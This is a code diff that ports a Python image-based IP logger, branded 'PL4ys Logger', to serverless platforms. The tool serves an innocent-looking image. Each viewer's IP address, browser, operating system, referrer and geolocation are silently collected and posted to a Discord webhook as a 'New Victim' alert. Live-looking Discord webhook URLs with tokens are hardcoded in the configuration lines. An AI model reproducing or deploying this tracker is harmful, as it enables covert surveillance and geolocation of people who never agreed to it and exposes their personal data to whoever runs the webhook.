@@ -1,4 +1,4 @@
-from http.server import BaseHTTPRequestHandler, HTTPServer
+from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import httpx
 import base64
@@ -7,16 +7,15 @@ import json
 from datetime import datetime
 import socket
 import threading
+import os
+import traceback
 
-# Configuration
-WEBHOOK_URL = 'https://discord.com/api/webhooks/1411799672355553405/uU2LsNrcqU_VXvSmygH5FH3TT5saPEWRR_uqg218VlNczy3YpTCTjbObgLmhcQwUIhj2'  # Replace with your webhook URL
-PORT = 8080  # Port to run the server on
-HOST = '0.0.0.0'  # Host to bind to (0.0.0.0 for all interfaces)
+# Configuration - use environment variables for serverless deployment
+WEBHOOK_URL = os.environ.get('DISCORD_WEBHOOK_URL', 'https://discord.com/api/webhooks/1411802910928666796/rEpOvJWFfEWb0Wzn1MChqebZvcmgRjwL9ldGLKEgiKavz1tuV5L1QGC16ZM8O73J-p_g')
+IMAGE_URL = os.environ.get('LOGGER_IMAGE_URL', 'https://images.pexels.com/photos/158827/field-corn-air-frisch-158827.jpeg?cs=srgb&dl=pexels-pixabay-158827.jpg&fm=jpg')
 
-# Custom image URL - replace with your image URL
-IMAGE_URL = "https://cdn.discordapp.com/attachments/1411745601233879050/1411799978539749376/raid_icon_server.jpg?ex=68b5f8b0&is=68b4a730&hm=9b714588bf3c45b8d9e3775091f018cebf3efc07f12ce339dcc6a48cd75caf7b"  # Replace with your image URL
-
-# Download the image once at startup
+# Download the image once at startup (with error handling)
+IMAGE_DATA = None
 try:
     response = httpx.get(IMAGE_URL, timeout=10)
     if response.status_code == 200:
@@ -81,26 +80,31 @@ class IPLoggerHandler(BaseHTTPRequestHandler):
                     target=self.send_to_discord,
                     args=(ip, user_agent, os, browser, referrer, timestamp, additional_info)
                 )
+                thread.daemon = True  # Make thread a daemon so it doesn't block server shutdown
                 thread.start()
                 
         except Exception as e:
-            print(f"Error: {e}")
+            print(f"Error in do_GET: {e}")
+            print(traceback.format_exc())
             # Still try to send the image even if logging fails
-            self.send_response(200)
-            self.send_header('Content-type', 'image/jpeg')
-            self.end_headers()
-            self.wfile.write(IMAGE_DATA)
+            try:
+                self.send_response(200)
+                self.send_header('Content-type', 'image/jpeg')
+                self.end_headers()
+                self.wfile.write(IMAGE_DATA)
+            except:
+                pass
 
     def get_client_ip(self):
         """Extract client IP from headers, accounting for proxies"""
         # Try common proxy headers
-        for header in ['x-forwarded-for', 'x-real-ip', 'client-ip', 'cf-connecting-ip']:
+        for header in ['x-forwarded-for', 'x-real-ip', 'x-client-ip', 'client-ip', 'cf-connecting-ip']:
             if header in self.headers:
                 ips = self.headers[header].split(',')
                 return ips[0].strip()  # Get the first IP in the chain
         
         # Fall back to direct connection
-        return self.client_address[0]
+        return self.client_address[0] if hasattr(self, 'client_address') else 'Unknown'
 
     def parse_user_agent(self, user_agent):
         """Parse user agent string"""
@@ -114,6 +118,18 @@ class IPLoggerHandler(BaseHTTPRequestHandler):
 
     def get_additional_info(self, ip):
         """Get additional information about the IP"""
+        if ip == 'Unknown':
+            return {
+                'city': 'Unknown',
+                'region': 'Unknown',
+                'country': 'Unknown',
+                'loc': 'Unknown',
+                'org': 'Unknown',
+                'postal': 'Unknown',
+                'timezone': 'Unknown',
+                'hostname': 'Unknown'
+            }
+            
         try:
             # Try to get info from ipinfo.io
             response = httpx.get(f'https://ipinfo.io/{ip}/json', timeout=5)
@@ -128,8 +144,8 @@ class IPLoggerHandler(BaseHTTPRequestHandler):
                     'postal': data.get('postal', 'Unknown'),
                     'timezone': data.get('timezone', 'Unknown')
                 }
-        except:
-            pass
+        except Exception as e:
+            print(f"Error getting IP info: {e}")
         
         # Fallback if ipinfo.io fails
         try:
@@ -151,19 +167,19 @@ class IPLoggerHandler(BaseHTTPRequestHandler):
     def send_to_discord(self, ip, user_agent, os, browser, referrer, timestamp, additional_info):
         """Send collected information to Discord webhook"""
         # Create a map emoji for the location
-        country_flag = f":flag_{additional_info['country'].lower()}:" if additional_info['country'] != 'Unknown' else ":question:"
+        country_flag = f":flag_{additional_info['country'].lower()}:" if additional_info['country'] != 'Unknown' and len(additional_info['country']) == 2 else ":question:"
         
         embed = {
             "username": "PL4ys Logger",
-            "avatar_url": "https://i.imgur.com/6e5kYp0.png",  # Replace with your avatar
-            "content": "@everyone",  # Ping everyone when someone views the image
+            "avatar_url": "https://i.imgur.com/6e5kYp0.png",
+            "content": "@everyone",
             "embeds": [
                 {
                     "title": "🚨 PL4ys Logger - New Victim",
-                    "color": 0xff0000,  # Red color for alert
+                    "color": 0xff0000,
                     "timestamp": timestamp,
                     "thumbnail": {
-                        "url": IMAGE_URL  # Show the image in the embed
+                        "url": IMAGE_URL
                     },
                     "footer": {
                         "text": "PL4ys Logger • Your digital watchman",
@@ -214,18 +230,88 @@ class IPLoggerHandler(BaseHTTPRequestHandler):
         except Exception as e:
             print(f"Failed to send to Discord: {e}")
 
-def run_server():
-    """Start the server"""
-    server = HTTPServer((HOST, PORT), IPLoggerHandler)
-    print(f"PL4ys Logger server running on {HOST}:{PORT}")
-    print(f"Using image from: {IMAGE_URL}")
-    print("Use this URL in an image tag: http://your-domain.com:" + str(PORT) + "/pixel.jpg")
-    print("Press Ctrl+C to stop the server")
+# Serverless function handler (for AWS Lambda, Vercel, etc.)
+def handler(event, context):
+    """Serverless function handler"""
     try:
-        server.serve_forever()
-    except KeyboardInterrupt:
-        print("\nShutting down server...")
-        server.shutdown()
+        # Extract information from the event
+        request_method = event.get('httpMethod', 'GET')
+        headers = {k.lower(): v for k, v in event.get('headers', {}).items()}
+        query_params = event.get('queryStringParameters', {}) or {}
+        
+        # Create a mock request handler
+        class MockRequest:
+            def __init__(self, path, headers):
+                self.path = path
+                self.headers = headers
+        
+        # Create a mock response writer
+        class MockResponse:
+            def __init__(self):
+                self.status_code = 200
+                self.headers = {}
+                self.body = b''
+            
+            def write(self, data):
+                self.body += data
+            
+            def set_header(self, key, value):
+                self.headers[key] = value
+            
+            def set_status(self, code):
+                self.status_code = code
+        
+        # Build the path with query parameters
+        path = event.get('path', '/')
+        if query_params:
+            path += '?' + '&'.join([f"{k}={v}" for k, v in query_params.items()])
+        
+        # Create mock objects
+        mock_request = MockRequest(path, headers)
+        response = MockResponse()
+        
+        # Create handler instance
+        handler_instance = IPLoggerHandler(mock_request, ('0.0.0.0', 80), None)
+        handler_instance.wfile = response
+        
+        # Call the do_GET method
+        handler_instance.do_GET()
+        
+        # Return the response
+        return {
+            'statusCode': response.status_code,
+            'headers': {
+                'Content-Type': 'image/jpeg',
+                **response.headers
+            },
+            'body': base64.b64encode(response.body).decode('utf-8'),
+            'isBase64Encoded': True
+        }
+    
+    except Exception as e:
+        print(f"Error in serverless handler: {e}")
+        print(traceback.format_exc())
+        return {
+            'statusCode': 500,
+            'body': json.dumps({'error': 'Internal server error'})
+        }
 
+# For local testing
 if __name__ == '__main__':
-    run_server()
+    from http.server import HTTPServer
+    import sys
+    
+    if len(sys.argv) > 1 and sys.argv[1] == 'local':
+        PORT = int(os.environ.get('PORT', 8080))
+        server = HTTPServer(('0.0.0.0', PORT), IPLoggerHandler)
+        print(f"PL4ys Logger server running on 0.0.0.0:{PORT}")
+        print(f"Using image from: {IMAGE_URL}")
+        print("Press Ctrl+C to stop the server")
+        try:
+            server.serve_forever()
+        except KeyboardInterrupt:
+            print("\nShutting down server...")
+            server.shutdown()
+    else:
+        print("This script is designed for serverless deployment.")
+        print("For local testing, run: python script.py local")
